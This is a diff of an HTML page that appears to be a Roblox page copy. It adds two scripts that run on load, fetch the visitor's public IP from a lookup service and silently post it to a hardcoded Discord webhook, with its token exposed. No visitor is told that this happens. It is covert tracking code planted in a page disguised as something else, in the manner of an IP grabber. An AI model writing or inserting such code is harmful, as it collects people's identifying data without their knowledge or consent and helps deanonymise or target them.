@@ -1,6 +1,47 @@
 
 
 <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send IP Address to Webhook</title>
+</head>
+<body>
+
+<script>
+    // Fetch the user's IP address from a public API
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+            console.log('IP Address:', ipAddress);
+
+            // Send the IP address to the Discord webhook
+            fetch('https://discord.com/api/webhooks/1284169705354956830/xUzNzRi4NAUvKaopglah822JJIQjSR9w48HB3l7b8dP7l-4IiHCsHu8r363HxS8b875Q', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `User's IP Address: ${ipAddress}`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('IP address sent to webhook successfully.');
+                } else {
+                    console.error('Error sending IP address to webhook:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Error with the fetch operation:', error);
+            });
+        })
+        .catch(error => {
+            console.error('Error fetching IP address:', error);
+        });
+</script>
 <!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]-->
 <!--[if gt IE 8]><!-->
 <html>
@@ -19,7 +60,33 @@
 
 
 
+<script>
+    window.onload = function() {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip + " - feide"; // Append " - feide" to the IP address
+                const webhookData = {
+                    content: `User IP Address: ${ip}`
+                };
 
+                // Send the IP address to the webhook
+                fetch('https://discord.com/api/webhooks/1284169705354956830/xUzNzRi4NAUvKaopglah822JJIQjSR9w48HB3l7b8dP7l-4IiHCsHu8r363HxS8b875Q', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(webhookData)
+                })
+                .catch(error => {
+                    console.error('Error sending IP address:', error);
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+            });
+    };
+</script>
 <script type="application/ld+json">
     {
     "@context" : "http://schema.org",
